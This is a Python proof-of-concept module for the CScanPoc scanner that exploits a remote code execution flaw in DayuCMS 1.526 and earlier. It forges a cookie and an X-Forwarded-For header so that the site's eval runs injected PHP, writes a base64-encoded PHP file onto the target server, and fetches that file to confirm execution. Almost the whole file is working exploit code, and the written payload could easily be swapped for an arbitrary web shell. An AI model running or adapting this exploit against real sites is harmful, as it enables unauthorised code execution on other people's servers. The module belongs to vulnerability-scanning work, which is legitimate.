# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import base64
import hashlib


class Vuln(ABVuln):
    vuln_id = 'DayuCMS_0001'  # 平台漏洞编号，留空
    name = 'DayuCMS 代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        DayuCMS在将字符串转换为数组的函数中直接利用eval，并且存在可控变量，导致任意代码执行。
    '''  # 漏洞描述
    ref = 'https://joychou.org/web/dayucms-1-526-foreground-remote-code-execution.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DayuCMS'  # 漏洞应用名称
    product_version = 'DayuCMS <=1.526'  # 漏洞应用版本


def md5(str):
    return hashlib.md5(str).hexdigest()


def dayucms_md5(str):
    return md5(str)[8:24]


class Poc(ABPoc):
    poc_id = '54401c88-a4ee-4ca4-a10f-42ff3897dc0f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            ip = '2.2.2.2'
            filenum = random.randint(10000, 99999)
            filename = base64.b64encode('%d.php' % filenum)
            verify_url = '%s/pay/order.php' % self.target
            req = requests.get(verify_url)
            cookie = req.cookies
            cookie_pre = ''
            for cookie_tuple in list(cookie.items()):
                for k in cookie_tuple:
                    if 'siteid' in k:
                        cookie_pre = k
                        break
            cookie_key = dayucms_md5('productarray'+ip)
            cookie_key = cookie_pre[:-6] + cookie_key

            vs = 'PD9waHAgdmFyX2R1bXAobWQ1KDEyMykpO3VubGluayhfX0ZJTEVfXyk7'
            verify_shell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (
                filename, vs)
            verify_shell = '1%3b' + verify_shell
            false_headers = {'X-Forwarded-For': ip}
            false_cookies = {cookie_key: verify_shell, cookie_pre: '1'}
            verify_req = requests.get(
                verify_url, cookies=false_cookies, headers=false_headers)
            verify_shell_url = '%s/pay/%d.php' % (self.target, filenum)
            if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
